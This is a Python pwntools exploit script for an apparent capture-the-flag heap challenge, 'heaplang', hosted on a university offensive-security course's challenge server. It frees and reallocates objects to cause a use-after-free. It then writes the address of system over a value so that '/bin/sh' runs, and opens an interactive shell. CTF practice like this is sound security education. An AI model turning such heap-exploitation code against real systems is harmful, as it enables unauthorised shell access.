from pwn import *
import sys

REMOTE = sys.argv[1]
heap = ELF('./heaplang')

if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1345)
    print(p.recvuntil(":"))
    print("joe215")
    p.sendline("joe215")
else:
    p = process('./heaplang')

print(p.recvuntil("Starting up..."))
print(p.recvuntil("Exit"))

def free(index):
    print(p.recvuntil("> "))
    p.sendline("4")
    print(p.recvuntil("Index?"))
    print(index)
    p.sendline(str(index))

def allocInt(value):
    print(p.recvuntil("> "))
    p.sendline("1")
    print(p.recvuntil("Type?"))
    p.sendline("0")
    print(p.recvuntil("Value?"))
    p.sendline(str(value))

def allocString(size, value):
    print(p.recvuntil("> "))
    p.sendline("1")
    print(p.recvuntil("Type?"))
    p.sendline("1")
    print(p.recvuntil("Length?"))
    p.sendline(str(size))
    print(p.recvuntil("Contents?"))
    p.sendline(str(value))


def editInt(index, value):
    print(p.recvuntil("> "))
    p.sendline("2")
    print(p.recvuntil("Index?"))
    p.sendline(str(index))
    p.sendline(str(value))

def editString(index, size, contents):
    print(p.recvuntil("> "))
    p.sendline("2")
    print(p.recvuntil("Index?"))
    p.sendline(str(index))
    print(p.recvuntil("Length?"))
    p.sendline(str(size))
    print(p.recvuntil("Contents?"))
    p.sendline(str(contents))

def innocent(index):
    print(p.recvuntil("> "))
    p.sendline("3")
    print(p.recvuntil("Index?"))
    print(str(index))
    p.sendline(str(index))

def command(index):
    print(p.recvuntil("> "))
    p.sendline("3")
    print(p.recvuntil("Index?"))
    p.sendline(str(index))
    p.interactive()

def exit():
    print(p.recvuntil("> "))
    p.sendline("5")

def pwn():
    sys = int("0x4006e0", 16)
    allocString(8, "/bin/sh")
    allocInt(88)

    innocent(0)
    innocent(1)
    free(0)
    free(1)
    innocent(1)

    allocString(8, "/bin/sh")
    editInt(1, sys)
    innocent(1)
    command(2)

pwn()
